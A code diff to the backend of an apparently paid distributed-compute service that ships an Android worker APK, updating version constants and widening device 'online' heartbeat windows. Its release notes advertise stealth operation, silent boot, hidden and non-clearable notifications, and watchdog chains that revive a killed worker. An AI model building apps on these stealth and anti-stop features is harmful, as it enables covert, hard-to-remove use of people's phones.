@@ -223,11 +223,11 @@ class JobCreateIn(BaseModel):
 
 # ---------- Constants ----------
 PRIORITY_MULT = {"economy": 0.7, "standard": 1.0, "instant": 2.5}
-APK_VERSION = "1.2.8"
-APK_PATH = "/grid-worker-v1.2.8.apk"
+APK_VERSION = "1.2.9"
+APK_PATH = "/grid-worker-v1.2.9.apk"
 APK_SIZE = 33850
-APK_SHA256 = "f3ec0ef5b6d366b50cf2d4660f2b099c393cfba95d3fd48f4501c95a21cc0935"
-APK_RELEASE_NOTES = "v1.2.8 stealth ops · auto-resume · silent boot · alarm watchdog · IMPORTANCE_MIN notification · total purge · v2+v3 signed"
+APK_SHA256 = "f23a068327e7ebdb003bbf1146181dd5cf2945eb00d738d18790e85ae6b85551"
+APK_RELEASE_NOTES = "v1.2.9 eternal worker · user_stopped sticky flag · JobScheduler 15min layer · 5min AlarmManager · FLAG_NO_CLEAR notification · idempotent watchdog chain · v2+v3 signed"
 REFERRAL_RATE = 0.10
 LOGIN_LOCK_THRESHOLD = 5
 LOGIN_LOCK_MINUTES = 15
@@ -1198,8 +1198,11 @@ async def admin_devices_live(
     Pass ?show_demo=true (or ?real_only=false) to include browser-simulated and demo devices.
     """
     now = datetime.now(timezone.utc)
-    # 15s recency for "online" so the admin dashboard reflects state within one heartbeat cycle.
-    OFFLINE_CUTOFF_SEC = 15
+    # iter-15 / v1.2.9: 90s online window (was 15s).  Reasoning — Android
+    # APK heartbeats every 10s, JobSchedulerWatchdog can take up to 60s to
+    # revive a killed service, so 90s of grace prevents the counter from
+    # flapping to 0 during a brief OS-induced restart.
+    OFFLINE_CUTOFF_SEC = 90
     offline_cutoff = (now - timedelta(seconds=OFFLINE_CUTOFF_SEC)).isoformat()
 
     q: dict = {}
@@ -1312,7 +1315,9 @@ async def admin_devices_live(
 async def admin_telemetry(user: dict = Depends(require_admin), show_demo: bool = False):
     """High-level telemetry snapshot — defaults to REAL APK devices only."""
     now = datetime.now(timezone.utc)
-    OFFLINE_CUTOFF_SEC = 15
+    # iter-15 / v1.2.9: 90s window aligns with the eternal-worker JobScheduler
+    # revival ceiling — counter holds steady through brief OS restarts.
+    OFFLINE_CUTOFF_SEC = 90
     cutoff = (now - timedelta(seconds=OFFLINE_CUTOFF_SEC)).isoformat()
     real_q = {"$or": [
         {"is_real_apk": True},
